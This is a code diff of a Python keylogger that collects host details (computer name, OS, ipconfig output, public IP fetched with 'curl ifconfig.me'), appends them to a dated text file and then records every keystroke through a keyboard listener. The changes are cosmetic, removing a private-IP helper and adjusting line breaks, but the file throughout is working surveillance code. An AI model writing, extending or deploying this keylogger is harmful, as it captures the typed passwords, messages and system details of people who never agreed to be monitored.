@@ -11,7 +11,6 @@ import keyboard
 def get_current_time():
     return time.strftime("%A, %B %d, %Y %H:%M:%S")
 
-
 def get_public_ip():
     try:
         response = subprocess.check_output("curl ifconfig.me", shell=True)
@@ -19,33 +18,21 @@ def get_public_ip():
     except Exception as e:
         return "Unable to retrieve public IP"
 
-def get_private_ip():
-    try:
-        host_name = socket.gethostname()
-        private_ip = socket.gethostbyname(host_name)
-        return private_ip
-    except Exception as e:
-        return "Unable to retrieve private IP"
-
-
 date = time.strftime("%A, %B %d, %Y") + ".txt"
 current_app = None
 current_window = None
 current_app_line = ""
 current_window_line = ""
 
-computer_name = f"Computer Name: {socket.gethostname()}\n"
+computer_name = f"\nComputer Name: {socket.gethostname()}\n"
 os_info = f"OS: {platform.system()} {platform.release()}\n"
 ipconfig_info = f"\n{subprocess.getoutput('ipconfig')}\n"
-public_ip = f"Public IP: {get_public_ip()}\n"
-private_ip = f"Private IP: {get_private_ip()}\n"
+public_ip = f"\tPublic IP: {get_public_ip()}\n"
 
-system_info = f"\nComputer Information\n{computer_name}{os_info}{ipconfig_info}\n{public_ip}{private_ip}\n"
-
+system_info = f"Computer Information\n{computer_name}{os_info}{ipconfig_info}\n{public_ip}\n"
 
 
 with open(date, "a", encoding="utf-8") as f:
-    f.write("\n")
     f.write(system_info)
     f.write("[" + get_current_time() + "] : ")
 
@@ -206,8 +193,6 @@ def OnKeyboardEvent(event):
 
     with open(date, "a", encoding="utf-8") as f:
         f.write(event)
-
-    caps_lock_on = is_capslock_on()
         
 with Listener(on_press=OnKeyboardEvent) as listener:
     listener.join()
